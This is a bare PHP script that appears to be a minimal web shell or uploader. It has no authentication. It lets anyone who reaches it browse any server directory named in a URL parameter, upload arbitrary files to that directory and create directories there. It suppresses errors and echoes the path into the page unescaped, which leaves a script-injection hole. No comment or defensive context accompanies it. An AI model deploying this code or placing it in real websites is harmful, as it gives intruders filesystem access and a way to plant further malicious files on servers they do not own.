<?php
if (isset($_GET['dir']) && !empty($_GET['dir'])) {
    $dir = $_GET['dir'];
    if (substr($dir, -1) != "/") {
        $dir .= "/";
        header("Location: ?dir=" . $dir);
    }
} else {
    $dir = __DIR__ . "/";
    header("Location: ?dir=" . $dir);
}
@chdir($dir);

if (isset($_POST['up'])) {
    for ($i = 0; $i < count($_FILES['file']['name']); $i++) {
        $namaFile = $_FILES['file']['name'][$i];
        $lokasiFile = $_FILES['file']['tmp_name'][$i];

        file_put_contents($dir . $namaFile, file_get_contents($lokasiFile));
    }
}
if (isset($_POST['mk'])) {
    mkdir($_POST['mkd']);
}
?>

<p>Path: <?= $dir; ?></p>
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file[]" multiple>
    <button type="submit" name="up">Up</button>
</form>
<p>File Manager:</p>
<form action="" method="post">
    <p>Make Dir: <input type="text" name="mkd"><button type="submit" name="mk" style="display: inline;">>></button></p>
</form>
<ol>

<?php
$scandir = scandir($dir);
for ($jj = 0; $jj < count($scandir); $jj++) {
if ($scandir[$jj] == "." || $scandir[$jj] == "..") {
    continue;
}
$ff = $scandir[$jj];
if (is_dir($ff)) { 
?>

<li><a href="?dir=<?= $dir . $ff; ?>"><?= $ff; ?></a></li>
<?php
} else {
?>
<li><?= $ff . " | " . filesize($ff); ?></li>
<?php
}
}
?>
</ol>